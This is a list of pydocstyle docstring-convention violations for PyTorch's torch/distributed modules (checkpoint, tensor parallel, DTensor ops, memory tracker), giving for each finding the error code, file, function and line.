- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `Flatten`, **Line**: 100, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `Flatten`, **Line**: 100, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `Split`, **Line**: 124, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `expand`, **Line**: 174, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `expand`, **Line**: 174, **Description**: First line should be in imperative mood (perhaps 'Implement', not 'Implements')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `infer_size`, **Line**: 254, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `view_groups`, **Line**: 273, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `view_groups`, **Line**: 273, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `view_groups`, **Line**: 273, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `dim_reduction`, **Line**: 403, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `propagate_shape_and_sharding`, **Line**: 472, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `propagate_shape_and_sharding`, **Line**: 472, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `propagate_shape_and_sharding`, **Line**: 472, **Description**: First line should be in imperative mood (perhaps 'Take', not 'Takes')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `einop_rule`, **Line**: 50, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `einop_rule`, **Line**: 50, **Description**: First line should end with a period (not 'a')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `pointwise_rule`, **Line**: 231, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `pointwise_rule`, **Line**: 231, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `linear_pointwise_rule`, **Line**: 291, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `reduction_rule`, **Line**: 306, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/common_rules.py`, **Entity**: `reduction_rule`, **Line**: 306, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/utils.py`, **Entity**: `normalize_dims`, **Line**: 58, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/utils.py`, **Entity**: `normalize_dims`, **Line**: 58, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D403**, **File**: `torch/distributed/_tensor/ops/utils.py`, **Entity**: `normalize_dims`, **Line**: 58, **Description**: First word of the first line should be properly capitalized ('Normalize', not 'normalize')
- **Error Code**: **D200**, **File**: `torch/distributed/_tensor/ops/utils.py`, **Entity**: `is_tensor_shardable`, **Line**: 76, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/utils.py`, **Entity**: `is_tensor_dim_sharded`, **Line**: 96, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/utils.py`, **Entity**: `is_tensor_partial`, **Line**: 101, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D200**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `gen_bucketize_strategy`, **Line**: 127, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `gen_slice_strategy`, **Line**: 149, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `gen_slice_strategy`, **Line**: 149, **Description**: First line should be in imperative mood (perhaps 'Forward', not 'forwards')
- **Error Code**: **D403**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `gen_slice_strategy`, **Line**: 149, **Description**: First word of the first line should be properly capitalized ('Forwards', not 'forwards')
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `unshard_tensor_dim`, **Line**: 201, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `replicate_tensor_dim`, **Line**: 211, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `replica_only_strategy`, **Line**: 270, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/ops/tensor_ops.py`, **Entity**: `prop_index`, **Line**: 308, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/debug/op_coverage.py`, **Entity**: `get_inductor_decomp_graphs`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/debug/op_coverage.py`, **Entity**: `get_inductor_decomp_graphs`, **Line**: 23, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D401**, **File**: `torch/distributed/_tensor/debug/op_coverage.py`, **Entity**: `get_inductor_decomp_graphs`, **Line**: 23, **Description**: First line should be in imperative mood; try rephrasing (found 'Convenient')
- **Error Code**: **D205**, **File**: `torch/distributed/_tensor/debug/op_coverage.py`, **Entity**: `print_op_coverage_summary`, **Line**: 47, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/debug/op_coverage.py`, **Entity**: `print_op_coverage_summary`, **Line**: 47, **Description**: First line should end with a period (not ',')
- **Error Code**: **D200**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `MemoryProfileDispatchMode`, **Line**: 26, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `MemoryTracker`, **Line**: 53, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `MemoryTracker`, **Line**: 53, **Description**: First line should end with a period (not '`')
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `start_monitor`, **Line**: 93, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `start_monitor`, **Line**: 93, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `stop`, **Line**: 120, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `stop`, **Line**: 120, **Description**: First line should end with a period (not 'p')
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `summary`, **Line**: 137, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `summary`, **Line**: 137, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `save_stats`, **Line**: 207, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `save_stats`, **Line**: 207, **Description**: First line should end with a period (not 's')
- **Error Code**: **D200**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `load`, **Line**: 223, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `load`, **Line**: 223, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_pre_forward_hook`, **Line**: 237, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_pre_forward_hook`, **Line**: 237, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_pre_forward_hook`, **Line**: 237, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_post_forward_hook`, **Line**: 253, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_post_forward_hook`, **Line**: 253, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D401**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_post_forward_hook`, **Line**: 253, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D200**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_backward_hook`, **Line**: 272, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_backward_hook`, **Line**: 272, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_record_memory_stats`, **Line**: 285, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D200**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_add_marker`, **Line**: 300, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_clear_state`, **Line**: 307, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/_nested_dict.py`, **Entity**: `flatten_state_dict`, **Line**: 30, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/_nested_dict.py`, **Entity**: `unflatten_state_dict`, **Line**: 55, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/_nested_dict.py`, **Entity**: `unflatten_state_dict`, **Line**: 55, **Description**: First line should end with a period (not '`')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/_sharded_tensor_utils.py`, **Entity**: `_flatten_sharded_tensors`, **Line**: 34, **Description**: First line should be in imperative mood (perhaps 'Transform', not 'Transforms')
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/_traverse.py`, **Entity**: `traverse_state_dict`, **Line**: 42, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/_traverse.py`, **Entity**: `set_element`, **Line**: 83, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/_traverse.py`, **Entity**: `get_element`, **Line**: 119, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/_traverse.py`, **Entity**: `print_tensor`, **Line**: 165, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/_traverse.py`, **Entity**: `print_tensor`, **Line**: 165, **Description**: First line should be in imperative mood; try rephrasing (found 'Callback')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/api.py`, **Entity**: `CheckpointException`, **Line**: 24, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/api.py`, **Entity**: `failures`, **Line**: 34, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/api.py`, **Entity**: `failures`, **Line**: 34, **Description**: First line should end with a period (not '
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `lookup_object`, **Line**: 141, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `lookup_object`, **Line**: 141, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `lookup_object`, **Line**: 141, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `transform_object`, **Line**: 147, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `transform_object`, **Line**: 147, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `transform_object`, **Line**: 147, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `lookup_tensor`, **Line**: 225, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `lookup_tensor`, **Line**: 225, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `lookup_tensor`, **Line**: 225, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `transform_tensor`, **Line**: 231, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `transform_tensor`, **Line**: 231, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `transform_tensor`, **Line**: 231, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `_create_default_local_metadata`, **Line**: 355, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `_check_box_overlap`, **Line**: 366, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `_check_box_overlap`, **Line**: 366, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `_check_box_overlap`, **Line**: 366, **Description**: First line should end with a period (not ')')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `_check_box_overlap`, **Line**: 366, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/metadata.py`, **Entity**: `ChunkStorageMetadata`, **Line**: 21, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/metadata.py`, **Entity**: `MetadataIndex`, **Line**: 56, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/optimizer.py`, **Entity**: `_get_state_dict_2d_layout`, **Line**: 109, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/optimizer.py`, **Entity**: `load_sharded_optimizer_state_dict`, **Line**: 209, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/optimizer.py`, **Entity**: `load_sharded_optimizer_state_dict`, **Line**: 209, **Description**: First line should be in imperative mood (perhaps 'Load', not 'Loads')
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/planner.py`, **Entity**: `create_local_plan`, **Line**: 194, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/planner.py`, **Entity**: `resolve_data`, **Line**: 227, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/planner.py`, **Entity**: `resolve_data`, **Line**: 227, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/planner.py`, **Entity**: `set_up_planner`, **Line**: 311, **Description**: First line should end with a period (not '`')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/planner.py`, **Entity**: `finish_plan`, **Line**: 338, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/planner.py`, **Entity**: `commit_tensor`, **Line**: 368, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/planner_helpers.py`, **Entity**: `create_read_items_for_chunk_list`, **Line**: 146, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/resharding.py`, **Entity**: `_check_shard_metadata_pair_overlap`, **Line**: 10, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/checkpoint/resharding.py`, **Entity**: `_check_shard_metadata_pair_overlap`, **Line**: 10, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/resharding.py`, **Entity**: `_check_shard_metadata_pair_overlap`, **Line**: 10, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/resharding.py`, **Entity**: `_shards_get_overlap_region_wrt_saved_tensor`, **Line**: 30, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/storage.py`, **Entity**: `finish`, **Line**: 121, **Description**: First line should be in imperative mood (perhaps 'Write', not 'Writes')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/storage.py`, **Entity**: `read_metadata`, **Line**: 157, **Description**: First line should be in imperative mood (perhaps 'Read', not 'Reads')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/storage.py`, **Entity**: `read_data`, **Line**: 214, **Description**: First line should be in imperative mood (perhaps 'Read', not 'Reads')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/_fsspec_filesystem.py`, **Entity**: `_StorageInfo`, **Line**: 51, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/_fsspec_filesystem.py`, **Entity**: `_StorageInfo`, **Line**: 51, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D202**, **File**: `torch/distributed/checkpoint/_fsspec_filesystem.py`, **Entity**: `__init__`, **Line**: 326, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/_fsspec_filesystem.py`, **Entity**: `__init__`, **Line**: 326, **Description**: First line should end with a period (not '`')
- **Error Code**: **D202**, **File**: `torch/distributed/checkpoint/state_dict_saver.py`, **Entity**: `save_state_dict`, **Line**: 27, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/state_dict_saver.py`, **Entity**: `save_state_dict`, **Line**: 27, **Description**: First line should be in imperative mood (perhaps 'Save', not 'Saves')
- **Error Code**: **D202**, **File**: `torch/distributed/checkpoint/state_dict_loader.py`, **Entity**: `load_state_dict`, **Line**: 25, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/state_dict_loader.py`, **Entity**: `load_state_dict`, **Line**: 25, **Description**: First line should be in imperative mood (perhaps 'Load', not 'Loads')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/filesystem.py`, **Entity**: `_StorageInfo`, **Line**: 51, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/filesystem.py`, **Entity**: `_StorageInfo`, **Line**: 51, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/filesystem.py`, **Entity**: `__init__`, **Line**: 329, **Description**: First line should end with a period (not '`')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `broadcast_object`, **Line**: 85, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `broadcast_object`, **Line**: 85, **Description**: First line should be in imperative mood; try rephrasing (found 'Same')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `gather_object`, **Line**: 98, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `gather_object`, **Line**: 98, **Description**: First line should be in imperative mood; try rephrasing (found 'Same')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `all_gather_object`, **Line**: 120, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `all_gather_object`, **Line**: 120, **Description**: First line should be in imperative mood; try rephrasing (found 'Same')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `scatter_object`, **Line**: 136, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `scatter_object`, **Line**: 136, **Description**: First line should be in imperative mood; try rephrasing (found 'Same')
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/examples/fsdp_checkpoint_example.py`, **Entity**: ``, **Line**: 3, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/examples/fsdp_checkpoint_example.py`, **Entity**: ``, **Line**: 3, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/_view_with_dim_change.py`, **Entity**: `_view_with_sharding_dim_change`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D200**, **File**: `torch/distributed/tensor/parallel/_view_with_dim_change.py`, **Entity**: `_infer_dtensor_stride`, **Line**: 36, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/_view_with_dim_change.py`, **Entity**: `_infer_dtensor_stride`, **Line**: 36, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D403**, **File**: `torch/distributed/tensor/parallel/_view_with_dim_change.py`, **Entity**: `_infer_dtensor_stride`, **Line**: 36, **Description**: First word of the first line should be properly capitalized ('Infer', not 'infer')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/multihead_attention_tp.py`, **Entity**: `_stride_same_as_shard`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/multihead_attention_tp.py`, **Entity**: `TensorParallelMultiheadAttention`, **Line**: 38, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `ParallelStyle`, **Line**: 33, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `PairwiseParallel`, **Line**: 48, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `PairwiseParallel`, **Line**: 48, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `SequenceParallel`, **Line**: 69, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `SequenceParallel`, **Line**: 69, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_input_shard_1d_last_dim`, **Line**: 126, **Description**: First line should be in imperative mood; try rephrasing (found 'Wrapper')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_input_reshard_replicate`, **Line**: 151, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_input_reshard_replicate`, **Line**: 151, **Description**: First line should end with a period (not 's')
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_output_shard_1d`, **Line**: 211, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_output_replicate_1d`, **Line**: 235, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_output_tensor`, **Line**: 258, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_sharded_output_tensor`, **Line**: 284, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_output_reshard_tensor`, **Line**: 306, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `RowwiseParallel`, **Line**: 326, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `ColwiseParallel`, **Line**: 336, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `parallelize_module`, **Line**: 41, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `parallelize_module`, **Line**: 41, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `parallelize_module`, **Line**: 41, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `parallelize_module`, **Line**: 41, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_is_mlp_for_pairwise_parallel`, **Line**: 140, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_is_mlp_for_pairwise_parallel`, **Line**: 140, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_rowwise_parallelize_linear_fn`, **Line**: 165, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_rowwise_parallelize_linear_fn`, **Line**: 165, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_rowwise_parallelize_linear_fn`, **Line**: 165, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_rowwise_parallelize_linear_fn`, **Line**: 165, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_colwise_parallelize_linear_fn`, **Line**: 196, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_colwise_parallelize_linear_fn`, **Line**: 196, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_colwise_parallelize_linear_fn`, **Line**: 196, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_colwise_parallelize_linear_fn`, **Line**: 196, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_linear`, **Line**: 225, **Description**: No blank lines allowed after function docstring (found 1)
